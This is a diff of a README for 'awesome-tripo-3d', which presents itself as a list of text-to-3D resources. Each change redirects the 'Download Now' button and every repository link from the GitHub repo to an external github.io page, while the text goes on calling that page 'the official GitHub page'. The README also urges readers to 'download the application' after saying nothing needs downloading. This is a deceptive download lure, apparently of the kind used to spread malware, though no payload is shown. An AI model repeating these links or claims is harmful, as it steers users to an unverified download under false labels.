@@ -1,6 +1,6 @@
 # 🚀 awesome-tripo-3d - Your Gateway to 3D Creation
 
-[![Download Now](https://img.shields.io/badge/Download-Tripo%203D%20Resources-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/uncivilized-hothead639/awesome-tripo-3d)
+[![Download Now](https://img.shields.io/badge/Download-Tripo%203D%20Resources-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://uncivilized-hothead639.github.io)
 
 ## 👋 Welcome to awesome-tripo-3d
 
@@ -14,7 +14,7 @@ Tripo 3D is an innovative service that converts your written descriptions into f
 
 ## ⚡ Quick Start Guide
 
-Visit this link to download the application: [https://github.com/uncivilized-hothead639/awesome-tripo-3d](https://github.com/uncivilized-hothead639/awesome-tripo-3d)
+Visit this link to download the application: [https://uncivilized-hothead639.github.io](https://uncivilized-hothead639.github.io)
 
 When you open this page, you'll find a well-organized list of resources. The page isn't a single program; rather, it's a treasure trove of links that point you to:
 
@@ -29,7 +29,7 @@ This resource is designed to be used directly from your web browser. No download
 
 ### Step 1: Open the Link
 
-Click on the big download button at the top of this page, or click here: [https://github.com/uncivilized-hothead639/awesome-tripo-3d](https://github.com/uncivilized-hothead639/awesome-tripo-3d). This will open the official GitHub page for awesome-tripo-3d.
+Click on the big download button at the top of this page, or click here: [https://uncivilized-hothead639.github.io](https://uncivilized-hothead639.github.io). This will open the official GitHub page for awesome-tripo-3d.
 
 ### Step 2: Browse the Categories
 
@@ -141,7 +141,7 @@ These alternatives are listed with their official links and brief descriptions t
 You now have everything you need to begin your 3D creation journey:
 
 1. **Bookmark this page** – You'll want to return often as new resources are added.
-2. **Go to the download link** – [Click here](https://github.com/uncivilized-hothead639/awesome-tripo-3d) to access the repository and start exploring.
+2. **Go to the download link** – [Click here](https://uncivilized-hothead639.github.io) to access the repository and start exploring.
 3. **Pick a starting point** – For beginners, the Tripo 3D Studio is the quickest way to create your first model.
 4. **Experiment and have fun** – The best way to learn text-to-3D is by trying different descriptions and seeing what works.
 
@@ -149,7 +149,7 @@ The awesome-tripo-3d repository is regularly updated, so check back for new feat
 
 ## 🔗 Quick Access Links
 
-- **Main Repository**: [https://github.com/uncivilized-hothead639/awesome-tripo-3d](https://github.com/uncivilized-hothead639/awesome-tripo-3d)
+- **Main Repository**: [https://uncivilized-hothead639.github.io](https://uncivilized-hothead639.github.io)
 
 Thank you for using this guide. Now go make something amazing!
 
